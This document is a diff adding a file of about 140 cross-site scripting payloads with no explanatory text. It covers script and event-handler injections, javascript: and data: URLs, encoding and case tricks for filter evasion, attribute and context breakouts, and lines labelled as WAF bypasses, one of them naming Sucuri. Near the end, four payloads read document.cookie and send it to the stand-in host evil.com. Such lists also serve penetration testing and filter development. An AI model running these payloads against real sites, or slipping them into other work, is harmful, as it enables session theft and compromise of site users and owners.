@@ -1,0 +1,143 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img/src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<object data=javascript:alert(1)>
+
+<a href='javascript:alert(1)'>click</a>
+<a href='javascript:alert(document.cookie)'>click</a>
+<a href='javascript:alert("XSS")'>XSS</a>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+
+<button onclick='alert(1)'>click</button>
+<button onclick="alert(1)">click</button>
+<button onclick='alert(document.cookie)'>click</button>
+<button onclick="prompt(1337)">submit</button>
+<div onclick=alert(1)>click</div>
+<p onclick=alert(1)>click</p>
+
+<iframe src='javascript:alert(1)'></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src='javascript:alert(document.cookie)'></iframe>
+<iframe src="/" onclick="prompt(123)"></iframe>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+<img src=x onerror=alert(/XSS/)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1)>
+<svg onload=alert(1)//
+<svg onload="alert(1)"//
+<math><mi xlink:href="javascript:alert(1)">click
+
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>click</a>
+<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>click</a>
+
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</script>
+<script/x>alert(1)</script>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)/*
+<img src=x onerror=alert(1)-->
+<img """><script>alert(1)</script>">
+<img src='x'onerror='alert(1)'>
+<img/src='x'/onerror='alert(1)'>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+--><script>alert(1)</script>
+*/</script><script>alert(1)</script>/*
+
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+<a href='javascript:alert("XSS-BYPASS-123")'>Click</a>
+<a href='javascript:alert("Sucuri WAF Bypassed")'>Click</a>
+<a href='javascript:alert(document.domain + "\nCookie: " + document.cookie)'>Click</a>
+
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+<svg onload=alert(1)//
+<svg onload="alert(1)"//
+<svg/onload="alert(1)"//
+
+<img src=x onerror=\x61lert(1)>
+<img src=x onerror=al\u0065rt(1)>
+<img src=x onerror=eval('al'+'ert(1)')>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=this['alert'](1)>
+<img src=x onerror=[]['constructor']['constructor']('alert(1)')()>
+
+<img src=x onerror=alert(1) id=x>
+<img src=x id=x onerror=alert(1)>
+<img onerror=alert(1) src=x>
+<img	src=x	onerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>
+<input type=image src=x onerror=alert(1)>
+<input type=text onfocus=alert(1) autofocus>
+<keygen autofocus onfocus=alert(1)>
+<form><button formaction=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit>
+
+<script>fetch('https://evil.com/?c='+document.cookie)</script>
+<script>new Image().src='https://evil.com/?c='+document.cookie</script>
+<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
+<img src=x onerror="location='https://evil.com/?c='+document.cookie">
+
+';alert(1)//
+";alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+"-alert(1)-"
+\'-alert(1)//
+\"-alert(1)//
